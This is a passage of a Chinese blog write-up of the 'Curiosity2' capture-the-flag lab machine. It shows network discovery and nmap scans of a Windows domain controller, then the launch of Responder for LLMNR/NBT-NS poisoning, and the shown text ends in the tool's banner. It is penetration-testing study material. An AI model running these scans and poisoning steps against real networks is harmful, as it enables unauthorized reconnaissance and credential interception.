<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>thehackerslabs-Curiosity2 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:expert kali:192.168.31.34 靶机:192.168.31.207 目标发现root@kali2 [&#x2F;tmp] ➜  arp-scan -l                           [16:25:59] Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.31.34 Star">
<meta property="og:type" content="article">
<meta property="og:title" content="thehackerslabs-Curiosity2">
<meta property="og:url" content="https://tao0845.github.io/posts/e965f5ec/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="难度:expert kali:192.168.31.34 靶机:192.168.31.207 目标发现root@kali2 [&#x2F;tmp] ➜  arp-scan -l                           [16:25:59] Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.31.34 Star">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/12/03/OLFcbj.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/12/03/OLFYqY.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/12/03/OLFYqY.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/12/03/OLF9Cc.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/12/03/OLF2nr.png">
<meta property="article:published_time" content="2024-11-13T05:45:01.404Z">
<meta property="article:modified_time" content="2024-12-03T11:48:26.915Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="DCSync">
<meta property="article:tag" content="LLMNR">
<meta property="article:tag" content="ReadGMSAPassword">
<meta property="article:tag" content="GenericWrite">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/12/03/OLFcbj.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">98</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">153</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">目标发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#responder-LLMNR%E6%AC%BA%E9%AA%97"><span class="toc-number">3.</span> <span class="toc-text">responder-LLMNR欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lookupsid"><span class="toc-number">4.</span> <span class="toc-text">lookupsid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#winrm%E7%99%BB%E5%BD%95"><span class="toc-number">5.</span> <span class="toc-text">winrm登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-server%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.</span> <span class="toc-text">sql server信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bloodhound%E5%88%86%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">bloodhound分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#keepass%E7%88%86%E7%A0%B4"><span class="toc-number">8.</span> <span class="toc-text">keepass爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync%E6%94%BB%E5%87%BB"><span class="toc-number">9.</span> <span class="toc-text">DCSync攻击</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/e965f5ec/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">thehackerslabs-Curiosity2</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-11-13 13:45:01" itemprop="dateCreated datePublished" datetime="2024-11-13T13:45:01+08:00">2024-11-13</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-12-03 19:48:26" itemprop="dateModified" datetime="2024-12-03T19:48:26+08:00">2024-12-03</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">5.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">31m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/thehackerlabs/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">thehackerlabs</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/DCSync/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">DCSync</span></a><a class="tag-item" href="/tags/LLMNR/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">LLMNR</span></a><a class="tag-item" href="/tags/ReadGMSAPassword/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ReadGMSAPassword</span></a><a class="tag-item" href="/tags/GenericWrite/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">GenericWrite</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:expert</strong></p>
<p><strong>kali:192.168.31.34</strong></p>
<p><strong>靶机:192.168.31.207</strong></p>
<h2 id="目标发现"><a href="#目标发现" class="headerlink" title="目标发现"></a>目标发现</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                           <span class="token punctuation">[</span><span class="token number">16</span>:25:59<span class="token punctuation">]</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.31.34
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token punctuation">..</span>.
<span class="token number">192.168</span>.31.207  08:00:27:3b:94:dc       PCS Systemtechnik GmbH
<span class="token punctuation">..</span>.</code></pre>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.31.207 <span class="token parameter variable">-oG</span> ports.txt
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-12-03 <span class="token number">16</span>:26 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.31.207
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00011s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65510</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5
<span class="token number">593</span>/tcp   <span class="token function">open</span>  http-rpc-epmap
<span class="token number">636</span>/tcp   <span class="token function">open</span>  ldapssl
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  globalcatLDAP
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  globalcatLDAPssl
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  wsman
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  adws
<span class="token number">47001</span>/tcp <span class="token function">open</span>  winrm
<span class="token number">49664</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49665</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49666</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49668</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49685</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49686</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49691</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49698</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49713</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49754</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">57936</span>/tcp <span class="token function">open</span>  unknown
MAC Address: 08:00:27:3B:94:DC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">14.16</span> seconds
root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> ports.txt <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'\d&#123;1,5&#125;/open'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span> <span class="token assign-left variable">FS</span><span class="token operator">=</span><span class="token string">'/'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">' '</span> <span class="token string">','</span>
<span class="token number">53,88</span>,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49685,49686,49691,49698,49713,49754,57936</code></pre>
<p>扫一下对应服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.31.207 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49686,49687,49693,49701,49710,49725,57936 
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-12-03 <span class="token number">16</span>:27 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.31.207
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00025s latency<span class="token punctuation">)</span>.

PORT      STATE  SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>   domain        Simple DNS Plus
<span class="token number">88</span>/tcp    <span class="token function">open</span>   kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2024</span>-12-03 08:27:47Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>   netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>   ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: cons.thl, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token operator">|</span>_ssl-date: <span class="token number">2024</span>-12-03T08:28:44+00:00<span class="token punctuation">;</span> 0s from scanner time.
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1::<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Not valid before: <span class="token number">2024</span>-10-11T16:05:23
<span class="token operator">|</span>_Not valid after:  <span class="token number">2025</span>-10-11T16:05:23
<span class="token number">445</span>/tcp   <span class="token function">open</span>   microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>   kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>   ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>   ssl/ldap      Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: cons.thl, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token operator">|</span>_ssl-date: <span class="token number">2024</span>-12-03T08:28:44+00:00<span class="token punctuation">;</span> 0s from scanner time.
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1::<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Not valid before: <span class="token number">2024</span>-10-11T16:05:23
<span class="token operator">|</span>_Not valid after:  <span class="token number">2025</span>-10-11T16:05:23
<span class="token number">3268</span>/tcp  <span class="token function">open</span>   ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: cons.thl, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1::<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Not valid before: <span class="token number">2024</span>-10-11T16:05:23
<span class="token operator">|</span>_Not valid after:  <span class="token number">2025</span>-10-11T16:05:23
<span class="token operator">|</span>_ssl-date: <span class="token number">2024</span>-12-03T08:28:44+00:00<span class="token punctuation">;</span> 0s from scanner time.
<span class="token number">3269</span>/tcp  <span class="token function">open</span>   ssl/ldap      Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: cons.thl, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1::<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Not valid before: <span class="token number">2024</span>-10-11T16:05:23
<span class="token operator">|</span>_Not valid after:  <span class="token number">2025</span>-10-11T16:05:23
<span class="token operator">|</span>_ssl-date: <span class="token number">2024</span>-12-03T08:28:44+00:00<span class="token punctuation">;</span> 0s from scanner time.
<span class="token number">5985</span>/tcp  <span class="token function">open</span>   http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">9389</span>/tcp  <span class="token function">open</span>   mc-nmf        .NET Message Framing
<span class="token number">47001</span>/tcp <span class="token function">open</span>   http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">49664</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp closed unknown
<span class="token number">49686</span>/tcp <span class="token function">open</span>   ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49687</span>/tcp closed unknown
<span class="token number">49693</span>/tcp closed unknown
<span class="token number">49701</span>/tcp closed unknown
<span class="token number">49710</span>/tcp closed unknown
<span class="token number">49725</span>/tcp closed unknown
<span class="token number">57936</span>/tcp <span class="token function">open</span>   ms-sql-s      Microsoft SQL Server <span class="token number">2019</span> <span class="token number">15.00</span>.2000.00<span class="token punctuation">;</span> RTM
<span class="token operator">|</span> ms-sql-info: 
<span class="token operator">|</span>   <span class="token number">192.168</span>.31.207<span class="token punctuation">\</span>SQLEXPRESS: 
<span class="token operator">|</span>     Instance name: SQLEXPRESS
<span class="token operator">|</span>     Version: 
<span class="token operator">|</span>       name: Microsoft SQL Server <span class="token number">2019</span> RTM
<span class="token operator">|</span>       number: <span class="token number">15.00</span>.2000.00
<span class="token operator">|</span>       Product: Microsoft SQL Server <span class="token number">2019</span>
<span class="token operator">|</span>       Service pack level: RTM
<span class="token operator">|</span>       Post-SP patches applied: <span class="token boolean">false</span>
<span class="token operator">|</span>     TCP port: <span class="token number">57936</span>
<span class="token operator">|</span>_    Clustered: <span class="token boolean">false</span>
<span class="token operator">|</span> ms-sql-ntlm-info: 
<span class="token operator">|</span>   <span class="token number">192.168</span>.31.207<span class="token punctuation">\</span>SQLEXPRESS: 
<span class="token operator">|</span>     Target_Name: CONS
<span class="token operator">|</span>     NetBIOS_Domain_Name: CONS
<span class="token operator">|</span>     NetBIOS_Computer_Name: WIN-C73PROQLRHL
<span class="token operator">|</span>     DNS_Domain_Name: cons.thl
<span class="token operator">|</span>     DNS_Computer_Name: WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span>_    Product_Version: <span class="token number">10.0</span>.14393
<span class="token operator">|</span>_ssl-date: <span class="token number">2024</span>-12-03T08:28:44+00:00<span class="token punctuation">;</span> 0s from scanner time.
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Subject Alternative Name: othername: <span class="token number">1.3</span>.6.1.4.1.311.25.1::<span class="token operator">&lt;</span>unsupported<span class="token operator">></span>, DNS:WIN-C73PROQLRHL.cons.thl
<span class="token operator">|</span> Not valid before: <span class="token number">2024</span>-10-11T16:05:23
<span class="token operator">|</span>_Not valid after:  <span class="token number">2025</span>-10-11T16:05:23
MAC Address: 08:00:27:3B:94:DC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Microsoft Windows <span class="token number">2016</span>
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server <span class="token number">2016</span> build <span class="token number">10586</span> - <span class="token number">14393</span>
Network Distance: <span class="token number">1</span> hop
Service Info: Host: WIN-C73PROQLRHL<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled and required
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2024</span>-12-03T08:28:36
<span class="token operator">|</span>_  start_date: <span class="token number">2024</span>-12-03T15:20:05
<span class="token operator">|</span>_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:3b:94:dc <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.25</span> ms <span class="token number">192.168</span>.31.207

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">63.54</span> seconds</code></pre>
<p>域名<code>WIN-C73PROQLRHL.cons.thl</code>,嗯，有LDAP，SQL Server等服务，先把域名加到hosts</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token builtin class-name">echo</span> <span class="token string">'192.168.31.207 cons.thl WIN-C73PROQLRHL.cons.thl'</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts
<span class="token number">192.168</span>.31.207 cons.thl WIN-C73PROQLRHL.cons.thl</code></pre>

<h2 id="responder-LLMNR欺骗"><a href="#responder-LLMNR欺骗" class="headerlink" title="responder-LLMNR欺骗"></a>responder-LLMNR欺骗</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  responder <span class="token parameter variable">-I</span> eth0                                                   <span class="token punctuation">[</span><span class="token number">16</span>:36:55<span class="token punctuation">]</span>
                                         __
  .----.-----.-----.-----.-----.-----.--<span class="token operator">|</span>  <span class="token operator">|</span>.-----.----.
  <span class="token operator">|</span>   _<span class="token operator">|</span>  -__<span class="token operator">|</span>__ --<span class="token operator">|</span>  _  <span class="token operator">|</span>  _  <span class="token operator">|</span>     <span class="token operator">|</span>  _  <span class="token operator">||</span>  -__<span class="token operator">|</span>   _<span class="token operator">|</span>
  <span class="token operator">|</span>__<span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span>_____<span class="token operator">|</span>   __<span class="token operator">|</span>_____<span class="token operator">|</span>__<span class="token operator">|</span>__<span class="token operator">|</span>_____<span class="token operator">||</span>_____<span class="token operator">|</span>__<span class="token operator">|</span>
                   <span class="token operator">|</span>__<span class="token operator">|</span>

           NBT-NS, LLMNR <span class="token operator">&amp;</span> MDNS Responder <span class="token number">3.1</span>.4.0

  To support this project:
  Github -<span class="token operator">></span> https://github.com/sponsors/lgandx
  Paypal  -<span class="token operator">></span> https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="token punctuation">(</span>laurent.gaffie@gmail.com<span class="token punctuation">)</span>
  To <span class="token function">kill</span> this script hit CTRL-C


<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Poisoners:
    LLMNR                      <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    NBT-NS                     <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    MDNS                       <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DNS                        <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DHCP                       <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Servers:
    HTTP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
